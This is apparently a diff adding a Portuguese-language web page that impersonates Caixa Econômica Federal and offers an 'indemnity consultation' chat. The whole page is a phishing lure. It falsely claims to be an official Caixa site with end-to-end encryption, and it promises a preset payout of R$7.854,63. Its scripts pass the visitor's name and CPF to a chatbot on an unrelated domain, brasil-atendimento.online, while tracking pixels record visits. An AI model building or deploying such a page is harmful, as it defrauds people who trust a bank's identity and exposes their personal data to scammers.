@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <script>
+    window.pixelId = "67ef67b0655738af4b8dbdd8";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <!-- Meta Pixel Code -->
+  <script>
+    !function (f, b, e, v, n, t, s) {
+      if (f.fbq) return; n = f.fbq = function () {
+        n.callMethod ?
+        n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+      };
+      if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+      n.queue = []; t = b.createElement(e); t.async = !0;
+      t.src = v; s = b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t, s)
+    }(window, document, 'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '2853456888176959');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=2853456888176959&ev=PageView&noscript=1" /></noscript>
+  <!-- End Meta Pixel Code -->
+  <script src="https://otimizey-cdn.s3.us-east-1.amazonaws.com/scripts-utm-otimizey.js" async defer></script>;
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids data-utmify-ignore-iframe
+    async defer></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Atendimento Caixa - Consulta de Indenização</title>
+  <link rel="icon" href="../images/icons/favicon-caixa.ico" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Typebot Script -->
+  <script src="https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3/dist/web.js" type="module"></script>
+
+  <style>
+    :root {
+      --azul-caixa: #005CA9;
+      --azul-caixa-escuro: #004a87;
+      --laranja-caixa: #F39200;
+      --laranja-caixa-escuro: #e08600;
+      --cinza-claro: #F5F5F5;
+      --cinza-medio: #E0E0E0;
+      --cinza-escuro: #717171;
+      --verde-progresso: #00A651;
+    }
+
+    * {
+      font-family: 'Roboto', Arial, Helvetica, sans-serif !important;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', Arial, Helvetica, sans-serif;
+      background-color: #f2f2f2;
+      color: #333;
+      line-height: 1.6;
+    }
+
+    .official-bar {
+      background-color: var(--azul-caixa);
+      height: 5px;
+      width: 100%;
+    }
+
+    .caixa-pill {
+      background-color: var(--azul-caixa);
+      color: white;
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-size: 0.7rem;
+      font-weight: 500;
+      margin-left: 5px;
+    }
+
+    .chat-container {
+      border: 1px solid var(--cinza-medio);
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .chat-header {
+      background: var(--azul-caixa);
+      color: white;
+      padding: 10px 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+
+    .chat-header-info {
+      display: flex;
+      align-items: center;
+      margin-bottom: 0;
+    }
+
+    @media (max-width: 640px) {
+      .chat-header {
+        padding: 10px;
+      }
+
+      .chat-header-info {
+        margin-bottom: 5px;
+        width: 100%;
+        margin-right: 0;
+      }
+
+      .agent-name {
+        font-size: 13px;
+      }
+    }
+
+    .agent-avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background-color: white;
+      margin-right: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--azul-caixa);
+      font-weight: bold;
+      font-size: 14px;
+      border: 2px solid white;
+    }
+
+    .agent-info {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .agent-name {
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    .agent-status {
+      font-size: 12px;
+      opacity: 0.8;
+      display: flex;
+      align-items: center;
+    }
+
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      background-color: #4ade80;
+      border-radius: 50%;
+      margin-right: 5px;
+    }
+
+    .chat-actions {
+      display: flex;
+    }
+
+    .action-button {
+      background: none;
+      border: none;
+      color: white;
+      margin-left: 10px;
+      cursor: pointer;
+      opacity: 0.8;
+      transition: opacity 0.2s;
+    }
+
+    .action-button:hover {
+      opacity: 1;
+    }
+
+    .chat-iframe-container {
+      width: 100%;
+      background-color: white;
+    }
+
+    .chat-iframe {
+      width: 100%;
+      height: calc(100vh - 200px);
+      border: none;
+    }
+
+    .chat-footer {
+      background-color: #f9f9f9;
+      border-top: 1px solid var(--cinza-medio);
+      padding: 10px 15px;
+      font-size: 12px;
+      color: var(--cinza-escuro);
+      text-align: center;
+    }
+
+    .secure-badge {
+      display: inline-flex;
+      align-items: center;
+      margin-right: 15px;
+    }
+
+    .secure-badge svg {
+      margin-right: 5px;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 640px) {
+      .chat-iframe {
+        height: calc(100vh - 180px);
+      }
+    }
+
+    /* Marca d'água oficial */
+    .official-watermark {
+      position: fixed;
+      bottom: 20%;
+      right: 5%;
+      opacity: 0.03;
+      z-index: -1;
+      pointer-events: none;
+      transform: rotate(-30deg);
+    }
+  </style>
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            caixa: {
+              blue: '#005CA9',
+              orange: '#F39200',
+              darkblue: '#004a87',
+              lightgray: '#F5F5F5',
+              gray: '#717171'
+            }
+          },
+          fontFamily: {
+            sans: ['Roboto', 'Arial', 'Helvetica', 'sans-serif'],
+          }
+        }
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+      // Adicionar a data atual
+      const options = { day: '2-digit', month: '2-digit', year: 'numeric' };
+      const currentDate = new Date().toLocaleDateString('pt-BR', options);
+      document.getElementById('current-date').textContent = currentDate;
+
+      // Obter parâmetros da URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const cpf = urlParams.get('cpf') || '';
+
+      // Exibir dados do usuário
+      const userDataString = localStorage.getItem('userData');
+      if (userDataString) {
+        try {
+          const userData = JSON.parse(userDataString);
+
+          // Atualizar nome do usuário no título
+          const userName = userData.nome || 'Cliente';
+          document.getElementById('user-name').textContent = userName;
+
+          // Atualizar o título da aba
+          document.title = `Atendimento ${userName} - Caixa`;
+
+          // Formatar o CPF
+          const formatCPF = (cpf) => {
+            cpf = cpf.replace(/\D/g, '');
+            if (cpf.length !== 11) return cpf;
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+          };
+
+          // Exibir CPF formatado
+          const formattedCPF = formatCPF(userData.cpf || cpf);
+          document.getElementById('user-id').textContent = formattedCPF;
+
+          // Enviar informações para o iframe (se necessário)
+          const typebotIframe = document.getElementById('typebot-iframe');
+          if (typebotIframe) {
+            const typebotUrl = new URL(typebotIframe.src);
+
+            // Adicionar parâmetros ao typebot
+            typebotUrl.searchParams.set('name', userName);
+            typebotUrl.searchParams.set('cpf', userData.cpf || cpf);
+
+            // Atualizar URL do iframe
+            typebotIframe.src = typebotUrl.toString();
+          }
+        } catch (error) {
+          console.error('Erro ao processar dados do usuário:', error);
+        }
+      }
+
+      // Adicionar marca d'água oficial
+      const watermark = document.createElement('div');
+      watermark.className = 'official-watermark';
+      watermark.innerHTML = `
+        <img src="../images/logo-caixa.png" alt="Marca d'água Caixa" class="w-64 h-auto">
+      `;
+      document.body.appendChild(watermark);
+    });
+  </script>
+</head>
+
+<body class="min-h-screen bg-gray-100">
+  <!-- Barra oficial superior -->
+  <div class="official-bar"></div>
+
+  <!-- Cabeçalho -->
+  <header class="bg-white py-4 px-4 mb-4 shadow-md border-b-2 border-caixa-blue">
+    <div class="max-w-[1200px] mx-auto flex items-center justify-between">
+      <div class="flex items-center">
+        <img alt="Logo Caixa" width="120" height="35" class="w-auto h-10" src="../images/logo-caixa.png">
+        <div class="h-8 w-px bg-gray-300 mx-4"></div>
+        <div class="text-gray-800">
+          <div class="text-sm font-semibold">Atendimento Online</div>
+          <div class="text-xs text-gray-600">Serviço de Indenizações</div>
+        </div>
+      </div>
+      <div class="hidden md:flex items-center text-gray-700 text-sm">
+        <div class="mr-6 flex items-center">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1 text-caixa-blue" fill="none" viewBox="0 0 24 24"
+            stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+          </svg>
+          Acesso Seguro
+        </div>
+        <div class="flex items-center">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1 text-caixa-blue" fill="none" viewBox="0 0 24 24"
+            stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+          </svg>
+          <span id="current-date"></span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="container mx-auto px-4 pb-8">
+    <div class="max-w-[900px] w-full mx-auto mb-6">
+      <!-- Caminho de navegação -->
+      <div class="flex items-center text-xs text-gray-600 mb-4">
+        <a href="../index.html" class="hover:text-caixa-blue">Início</a>
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mx-1" fill="none" viewBox="0 0 24 24"
+          stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
+        </svg>
+        <a href="../verification/index.html" class="hover:text-caixa-blue">Consulta de Indenização</a>
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mx-1" fill="none" viewBox="0 0 24 24"
+          stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
+        </svg>
+        <span class="text-caixa-blue font-medium">Atendimento</span>
+      </div>
+
+      <!-- Container do chat -->
+      <div class="chat-container bg-white">
+        <div class="chat-header">
+          <div class="chat-header-info">
+            <div class="agent-avatar">
+              <img src="https://terrabrasilnoticias.com/wp-content/uploads/2024/01/i605527.jpeg" alt="Agente Caixa"
+                class="w-full h-full object-cover rounded-full"
+                onerror="this.src='../images/logo-caixa.png'; this.style.padding='5px';">
+            </div>
+            <div class="agent-info">
+              <div class="agent-name">Atendente Caixa</div>
+              <div class="agent-status">
+                <div class="status-dot"></div>
+                <span id="agent-status-text">online</span>
+              </div>
+            </div>
+          </div>
+          <div class="text-white text-xs md:text-sm">
+            <span class="block md:inline">Cliente: <span id="user-name">-</span></span>
+            <span class="hidden md:inline mx-1">|</span>
+            <span class="block md:inline">CPF: <span id="user-id">-</span></span>
+          </div>
+        </div>
+
+        <!-- Container do iframe do Typebot -->
+        <div class="chat-iframe-container">
+          <!-- Usando o componente nativo do Typebot para melhor integração -->
+          <div id="typebot-container" class="chat-iframe">
+            <typebot-standard id="typebot-standard"></typebot-standard>
+          </div>
+        </div>
+
+        <!-- Rodapé do chat -->
+        <div class="chat-footer">
+          <div class="flex flex-wrap justify-center">
+            <div class="secure-badge">
+              <svg class="h-4 w-4 text-green-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"
+                fill="currentColor">
+                <path fill-rule="evenodd"
+                  d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
+                  clip-rule="evenodd" />
+              </svg>
+              <span>Conexão segura</span>
+            </div>
+            <div class="secure-badge">
+              <svg class="h-4 w-4 text-caixa-blue" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"
+                fill="currentColor">
+                <path fill-rule="evenodd"
+                  d="M10 2a1 1 0 00-1 1v1a1 1 0 002 0V3a1 1 0 00-1-1zM4 4h3a3 3 0 006 0h3a2 2 0 012 2v9a2 2 0 01-2 2H4a2 2 0 01-2-2V6a2 2 0 012-2zm2.5 7a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm2.45 4a2.5 2.5 0 10-4.9 0h4.9zM12 9a1 1 0 100 2h3a1 1 0 100-2h-3zm-1 4a1 1 0 011-1h2a1 1 0 110 2h-2a1 1 0 01-1-1z"
+                  clip-rule="evenodd"></path>
+              </svg>
+              <span>Criptografia de ponta a ponta</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Informações adicionais -->
+      <div class="mt-4 bg-white p-4 rounded-lg text-sm text-gray-700">
+        <h3 class="font-medium text-caixa-blue mb-2 flex items-center">
+          <svg class="h-4 w-4 mr-1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd"
+              d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
+              clip-rule="evenodd" />
+          </svg>
+          Informações importantes
+        </h3>
+        <ul class="space-y-1 list-disc pl-5">
+          <li>Este é um atendimento oficial da Caixa Econômica Federal.</li>
+          <li>Seu atendimento está sendo gravado para fins de segurança e melhoria do serviço.</li>
+          <li>Não compartilhe sua senha ou código de acesso neste chat.</li>
+
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Rodapé -->
+  <footer class="bg-gradient-to-r from-caixa-blue to-caixa-darkblue text-white">
+    <!-- Rodapé principal -->
+    <div class="py-4 px-4">
+      <div class="container mx-auto max-w-[1200px]">
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 items-center">
+          <div class="flex justify-center md:justify-start">
+
+          </div>
+
+          <div class="text-center text-xs">
+            <p class="mb-1">© Caixa Econômica Federal - Todos os direitos reservados</p>
+            <p>CNPJ: 00.360.305/0001-04 - Sistema de Consulta de Indenizações</p>
+          </div>
+
+          <div class="flex justify-center md:justify-end space-x-4">
+
+          </div>
+        </div>
+
+        <div class="border-t border-white border-opacity-20 mt-3 pt-3 text-center text-xs text-white text-opacity-70">
+          <p>Este é um site oficial da Caixa Econômica Federal</p>
+
+          <div class="flex items-center justify-center mt-2">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24"
+              stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+            <span>Conexão segura via SSL - Seus dados estão protegidos</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script type="module">
+    // Inicializar o Typebot com configurações personalizadas
+    document.addEventListener('DOMContentLoaded', function () {
+      // Importar o Typebot
+      import('https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3/dist/web.js')
+        .then((module) => {
+          const Typebot = module.default;
+
+          // Obter dados do usuário
+          const userDataString = localStorage.getItem('userData');
+          const urlParams = new URLSearchParams(window.location.search);
+          const cpf = urlParams.get('cpf') || '';
+
+          let userName = 'Cliente';
+          let userCPF = cpf;
+
+          // Tentar obter dados do localStorage
+          if (userDataString) {
+            try {
+              const userData = JSON.parse(userDataString);
+              userName = userData.nome || 'Cliente';
+              userCPF = userData.cpf || cpf;
+            } catch (error) {
+              console.error('Erro ao processar dados do usuário:', error);
+            }
+          }
+
+          // Inicializar o Typebot com variáveis pré-definidas
+          Typebot.initStandard({
+            typebot: "caiixa",
+            apiHost: "https://chat.brasil-atendimento.online",
+            prefilledVariables: {
+              nome: userName,
+              cpf: userCPF,
+              valor: "7.854,63"
+            }
+          });
+        })
+        .catch((error) => {
+          console.error('Erro ao carregar o Typebot:', error);
+
+          // Fallback para iframe se o componente nativo falhar
+          const container = document.getElementById('typebot-container');
+          if (container) {
+            container.innerHTML = `
+              <iframe 
+                id="typebot-iframe"
+                class="w-full h-full border-none"
+                src=""
+                allow="camera; microphone; geolocation; clipboard-write;">
+              </iframe>
+            `;
+          }
+        });
+    });
+  </script>
+</body>
+
+</html>
